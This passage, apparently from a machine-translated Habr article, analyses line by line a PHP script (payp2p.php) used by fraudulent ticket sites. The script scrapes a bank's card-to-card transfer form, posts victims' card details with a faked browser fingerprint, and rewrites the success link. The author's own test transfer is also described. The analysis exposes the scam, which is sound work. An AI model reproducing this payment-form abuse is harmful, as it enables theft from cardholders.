L√≠nea 83-90: los par√°metros se establecen para la sesi√≥n con CURL (direcci√≥n de p√°gina almacenada anteriormente en $ login_url; identificador del navegador previamente almacenado en $ agent; p√°gina desde la cual se redirige o se hace referencia a la p√°gina; REFERER; configuraci√≥n de COOKIE, etc.) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 91 - Como resultado del comando curl_exec, se obtendr√° una p√°gina web mediante programaci√≥n, que se guardar√° en la variable $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 93-95 La p√°gina web guardada $ page contiene ~ "n√∫mero de pedido" ORDER_NUM, que se almacena en la variable $ ord.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 96-98 La p√°gina web de la p√°gina $ guardada contiene la marca de tiempo TIMESTAMP, que se almacena en la variable $ tim.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n de depuraci√≥n</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/416/148/8ba/4161488ba0f64c8d9575a7f973d3d841.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/6f6/35b/d05/6f635bd056d5466a956643acab2e3b30.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ahora un "navegador de software" necesita ir a la p√°gina </font></font><code>https://3ds.payment.ru/P2P_ACTION/card_form.html</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Esta es la misma p√°gina de pago, cuya captura de pantalla se muestra arriba. Esta es una p√°gina con un formulario, parte de los campos de servicio de los cuales est√°n ocultos. Parte del c√≥digo HTML con campos de entrada ocultos se mostr√≥ arriba. Es necesario recordar algunos valores de estos campos ocultos para poder usarlos m√°s adelante al enviar el formulario. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 99: guardamos la direcci√≥n de la p√°gina en la variable $ url. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 100: se establecen los par√°metros para la sesi√≥n con URL (en este caso, solo la direcci√≥n de la p√°gina. El resto de la configuraci√≥n sigue siendo la misma). </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 101-102 Se eliminan las variables $ page y $ part utilizadas anteriormente. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 103: como resultado del comando curl_exec, se obtendr√° una p√°gina web mediante programaci√≥n, que se guardar√° en la variable $ page.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 104-106 La p√°gina web de la p√°gina $ guardada contiene el valor del campo TERMINAL, que se almacena en la variable $ term. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 107-109 La p√°gina web de $ page guardada contiene el valor del campo TRTYPE, que se almacena en la variable $ type. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 110-112 La p√°gina web de la p√°gina $ guardada contiene el valor del campo COMERCIANTE, que se almacena en la variable $ merch. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 113-115 La p√°gina web de la p√°gina $ guardada contiene el valor del campo EMAIL, que se almacena en la variable $ ml. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En general, estos valores en la forma indicada nunca cambian. Y podr√≠an guardarse en el c√≥digo como constantes y no recibirse cada vez. Obviamente, la obtenci√≥n de los valores de estos campos se realiza para mayor seguridad en caso de que uno o m√°s campos cambien en alg√∫n momento en el futuro.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Descripci√≥n de algunos campos. </font><font style="vertical-align: inherit;">Una descripci√≥n completa de todos los campos es f√°cil de encontrar en Google.</font></font><br>
<br>
<blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">TERMINAL - N√∫mero √∫nico del terminal virtual de la tienda </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
MERCH_NAME - Nombre del punto de </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
venta COMERCIANTE - N√∫mero de la tienda asignada por el banco </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
TRTYPE - Tipo de transacci√≥n solicitada (Pago - 1, Cancelar - 22, Preautorizaci√≥n - 0, Finalizaci√≥n de liquidaciones - 21) </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
EMAIL - Direcci√≥n de correo electr√≥nico para enviar alertas</font></font></blockquote><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n de depuraci√≥n</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/bf5/4a7/457/bf54a74574f44b1a8cb34bfa95eac091.png"><br>
    ,   -   . ($page)<br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
CORREO ELECTR√ìNICO aqu√≠, este es un caso √©pico. A qui√©n le importa, materiales adicionales sobre este CORREO ELECTR√ìNICO al final del art√≠culo en la aplicaci√≥n bajo el spoiler. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9d4/cf1/5c9/9d4cf15c98584bc8a4dc45b78051ad26.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqu√≠ vemos un gran bloque. El hecho de que parezca grande se explica por el ancho de columna limitado en la publicaci√≥n y la presentaci√≥n conveniente del c√≥digo por el autor del script. De todos modos, se podr√≠a colocar en 10 l√≠neas de c√≥digo, pero la conveniencia de leer y editar el c√≥digo se ver√≠a afectada. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 120: en la variable $ url, guarde la direcci√≥n de la p√°gina. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 121-123: establezca par√°metros para una sesi√≥n con URL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 124: se crea una matriz de $ ncrd a partir del n√∫mero de tarjeta del destinatario en la variable de cadena $ crd, que contendr√° partes del n√∫mero de la tarjeta dividido en cuatro. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 125: los encabezados HTTP se almacenan en la variable de matriz $ headers.</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 126: los par√°metros se establecen para la sesi√≥n con CURL (encabezados HTTP de la variable $ headers. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 135-164: se crea una matriz $ postL, cada valor correspondiente al campo del formulario en la p√°gina de pago (n√∫mero de tarjeta del remitente, dividido por cuatro; fecha de vencimiento de la tarjeta del remitente) ; Tarjeta CVC del remitente; n√∫mero de tarjeta de destinatario de cuatro direcciones; fecha de vencimiento de la tarjeta del destinatario; tarjeta CVC del destinatario; monto del pago; "n√∫mero de pedido"; descripci√≥n de la p√°gina de confirmaci√≥n; n√∫mero de terminal; nombre del punto de venta; correo electr√≥nico para notificaciones; sello de tiempo ; n√∫mero de tarjeta del remitente no dividido en partes; n√∫mero de tarjeta del destinatario no dividido en partes; datos en software y hardware "en la computadora del remitente", dise√±ados para crear la apariencia de un usuario real, no un script).</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 135: los par√°metros se establecen para la sesi√≥n de cURL (datos transmitidos en la solicitud HTTP POST. En este caso, la matriz $ postL se convierte en una cadena, que es una cadena codificada en URL, como </font></font><code>'p1=val1&amp;p2=val2&amp;...'</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Los datos transmitidos con mayor claridad se muestran en la captura de pantalla con la informaci√≥n de depuraci√≥n a continuaci√≥n.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de informaci√≥n de depuraci√≥n</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/9b0/140/642/9b0140642ef74fbf968fa4c299677a33.png"><br>
</div></div><br>
<img src="https://habrastorage.org/files/f9e/70e/ac8/f9e70eac88e74b088d3c37c1736eab09.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 166: como resultado del comando curl_exec, los datos preparados se enviar√°n al formulario de la p√°gina web utilizando el m√©todo POST. Para una p√°gina web, dicho env√≠o se ver√° exactamente igual que si un usuario normal completara y confirmara el formulario en un navegador normal. La p√°gina con el resultado de enviar datos al formulario se guardar√° en la variable $ page. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 167: finaliza la sesi√≥n de cURL. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 168: en la p√°gina resultante, que se almacena en la variable $ page, y como recordamos, es una l√≠nea larga, se busca la subcadena "Error".</font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠neas 169-173: si se encuentra la subcadena "Error", se muestra durante 5 segundos el mensaje de error "La tarjeta no encaja" y luego el script sale y redirige la p√°gina que se muestra en el navegador a la "p√°gina de pedido". Si el usuario es persistente, puede intentar nuevamente el procedimiento de pago. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
P√°gina mostrada en caso de cualquier error. </font></font><br>
<br>
<img src="https://habrastorage.org/files/2f6/7b0/d80/2f67b0d80a7e49b88b9432eacd6d9085.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Las causas de los errores que emite el banco pueden ser diferentes (un error en el n√∫mero de tarjeta, fondos insuficientes, un error de autorizaci√≥n y muchos otros). Pero para el script payp2p.php no hay diferencia. Una vez que el pago ha fallado, significa que el usuario es redirigido a la p√°gina desde la que puede repetir el intento de pago. La p√°gina a la que se devuelve el error se puede cambiar f√°cilmente seg√∫n la tarea.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Ejemplo de c√≥digo HTML devuelto por la p√°gina del banco, en caso de error</font></font></b><div class="spoiler_text"><pre><code class="html hljs xml"><span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span><font></font>
<font></font>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">base</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">href</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/netcetera/netcetera.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"/riskminder-client.js"</span></span></span><span class="hljs-tag">&gt;</span></span><span class="undefined"></span><span class="hljs-tag"><span class="undefined"></span><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span><span class="javascript"><span class="javascript">
    </span><span class="hljs-function"><span class="hljs-keyword"><span class="javascript"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span></span><span class="javascript"><span class="hljs-function"> </span></span><span class="hljs-title"><span class="javascript"><span class="hljs-function"><span class="hljs-title">redirect</span></span></span></span><span class="javascript"><span class="hljs-function">(</span></span><span class="hljs-params"><span class="javascript"><span class="hljs-function"><span class="hljs-params">rctext, ext_diag_code</span></span></span></span><span class="javascript"><span class="hljs-function">)</span></span></span><span class="javascript">{
	</span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Call your bank"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/CallYourBank"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is restricted"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ForbiddenTransaction"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Your card is disabled"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/BlockedCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Invalid amount"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in amount field"</span></span></span><span class="javascript"> || rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Wrong original amount"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectAmount"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Re-enter transaction"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/Retry"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Expired card"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/ExpiredCard"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Not sufficient funds"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/InsufficientBalance"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds amount limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/AmountOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Exceeds frequency limit"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/QuantityOverlimit"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card number field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectNumber"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in card expiration date field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectExpiresDate"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Error in currency field"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectCurrency"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"AS_FAIL"</span></span></span><span class="javascript">){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/IncorrectPassword"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">if</span></span></span><span class="javascript"> (rctext == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"Authentication failed"</span></span></span><span class="javascript"> &amp;&amp; (ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"NS_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"S_ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"ATTEMPT"</span></span></span><span class="javascript"> || ext_diag_code == </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"UNAVAIL"</span></span></span><span class="javascript">)){
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/3DSFailure"</span></span></span><span class="javascript">;
	} </span><span class="hljs-keyword"><span class="javascript"><span class="hljs-keyword">else</span></span></span><span class="javascript"> {
		</span><span class="hljs-built_in"><span class="javascript"><span class="hljs-built_in">window</span></span></span><span class="javascript">.top.location = </span><span class="hljs-string"><span class="javascript"><span class="hljs-string">"http://www.psbank.ru/Card2Card/TechReasons"</span></span></span><span class="javascript">;
	}
   }
</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">script</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onload</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"netcetera_set_DID('');redirect('Authentication failed','BIN_ERROR')"</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span>
<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span>
</code></pre><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Un ejemplo de informaci√≥n de depuraci√≥n si el banco informa un error al pagar</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/73f/c74/88a/73fc7488aa40469da8984c474be4ae1b.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 174: si no hubo una salida anterior del script debido a un error al pagar, esto significa que todo va seg√∫n lo previsto. </font><font style="vertical-align: inherit;">En la p√°gina previamente guardada en la variable $ page, todas las subcadenas con la direcci√≥n se reemplazan con una </font></font><code>https://3ds.payment.ru/cgi-bin/cgi_link</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cadena con una direcci√≥n del tipo mydomain.ru/sus.php?cd = ... - esta es la direcci√≥n de la p√°gina en el sitio fraudulento al que debe llegar el usuario si el pago se realiza correctamente. </font><font style="vertical-align: inherit;">(En dicha p√°gina, se puede agradecer e informar al usuario que se han enviado tickets electr√≥nicos por correo). </font><font style="vertical-align: inherit;">Despu√©s de reemplazar la subcadena, el resultado se almacena en la variable $ pp.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
L√≠nea 175: la variable $ pp se muestra en el navegador. Como la variable $ pp es una cadena con el c√≥digo HTML completo de la p√°gina, el usuario ver√° alguna p√°gina. La p√°gina mostrada no diferir√° externamente de la p√°gina original que proporcion√≥ el banco; la diferencia solo estar√° dentro del c√≥digo HTML en el lugar donde se reemplaz√≥ el enlace. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Entonces, ¬øqu√© es esta p√°gina que proporciona el banco en caso de ingresar el n√∫mero de tarjeta correcto y en el que el script sustituye un enlace a la p√°gina de pago exitosa en un sitio web fraudulento? Y despu√©s de todo, probablemente, todav√≠a deber√≠a haber un cheque 3D Secure de los bancos emisores, que no permitir√° el pago. El c√≥digo termin√≥ en el lugar m√°s interesante y hay dudas de que sin scripts, formularios, etc.</font></font><br>
<br>
<b>     .          - .     .       .</b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Conduzco el n√∫mero de mi tarjeta bancaria en el archivo aviacfg.php. Intentar√© aceptar la transferencia, si, por supuesto, funciona. Abro la p√°gina del formulario previamente guardada en el disco. Este formulario simplemente se guard√≥ en el navegador cuando visit√≥ uno de los sitios fraudulentos, que al momento de escribir la primera parte de la publicaci√≥n, todav√≠a funcionaba. El formulario ya se ha guardado con la suma de 2915 rublos, pero para probarlo es demasiado. Vamos a cambiarlo En cualquier forma, hay campos visibles y ocultos. Los campos ocultos (entrada, selecci√≥n) no son diferentes de los campos normales, excepto que no son visibles. Dichos campos se utilizan para almacenar informaci√≥n de servicio que el usuario no necesita ver. Los campos de entrada est√°n ocultos de dos maneras.</font></font><br>
<br>
<ul>
<li>  CSS ( display:none).    ,     (input),    , ( DIV)     input.</li>
<li>     ‚Äî   ,  type=¬´hidden¬ª.      type=¬´text¬ª.</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
En nuestro caso, los campos del formulario se ocultan usando type = "hidden". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Presionamos en el navegador F12 (modo de desarrollo web). Encuentre el lugar correcto en el c√≥digo HTML y cambie el texto type = "hidden" a type = "text" para dos o m√°s elementos de entrada. Ahora vemos los campos en los que se almacenan la suma y el c√≥digo de servicio (c√≥digo). Reduzca la cantidad de 2915rub a 20rub. Ahora ingrese los datos de su segunda tarjeta bancaria en el formulario. Se debe debitar dinero de esta tarjeta si es posible realizar una transferencia. </font></font><br>
<br>
<img src="https://habrastorage.org/files/ad2/9e5/fa2/ad29e5fa23e54550a59d9b54dd808ada.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Confirmamos el formulario haciendo clic en el bot√≥n "Pagar". Despu√©s de hacer clic en el bot√≥n, se inicia el script payp2p.php, que recibe los datos ingresados ‚Äã‚Äãen el formulario.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para mi sorpresa, despu√©s de ingresar el n√∫mero de tarjeta real y hacer clic en el bot√≥n "Pagar" en el formulario de prueba, vi la p√°gina de Sberbank (el banco desde el que se realiza la transferencia) en la pantalla, pidi√©ndome que ingrese el c√≥digo de confirmaci√≥n 3D Secure. </font></font><br>
<br>
<img src="https://habrastorage.org/files/587/7a4/aa3/5877a4aa3a514b3bb171c8ba1e264f07.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Tambi√©n en mi tel√©fono recib√≠ un SMS de Sberbank con un c√≥digo.</font></font><br>
<br>
<img src="https://habrastorage.org/files/c3b/628/abc/c3b628abc43a446bb15606dec3b9f083.jpg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Antes de probar con una tarjeta de cr√©dito v√°lida, supuse que para confirmar el c√≥digo 3D Secure, tendr√≠a que ser "enga√±ado" al usuario de alguna manera, y luego transferir mediante programaci√≥n encubiertamente la confirmaci√≥n 3D Secure a este formulario. Sin embargo, todo result√≥ ser mucho m√°s simple. Despu√©s de que los datos para transferir de una tarjeta a otra se env√≠an al sitio web de Promsvyazbank, el navegador muestra la forma del banco emisor de la tarjeta desde el que se realiza la transferencia. En mi caso, este es Sberbank. Este formulario ni siquiera necesita ser falsificado. El formulario de confirmaci√≥n se muestra en el sitio web HTTPS de Sberbank. Las v√≠ctimas de los estafadores directamente en este formulario familiar para ellos ingresan un c√≥digo de confirmaci√≥n. Despu√©s de eso, si se aprueba la transferencia, se carga el dinero. Aunque es te√≥ricamente posible protestar contra tal transferencia, est√° lejos del hecho de que el dinero ser√° devuelto.La probabilidad de un reembolso se ve afectada por muchos factores, incluida la rapidez con que la "v√≠ctima" se aplicar√° a su banco.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
C√≥digo HTML de la p√°gina que Sberbank entrega para confirmar 3D Secure bajo el spoiler. </font><font style="vertical-align: inherit;">El c√≥digo se obtuvo durante la prueba escribiendo la variable $ page en un archivo de texto. </font><font style="vertical-align: inherit;">L√≠nea 166 del script payp2p.php.</font></font><br>
<br>
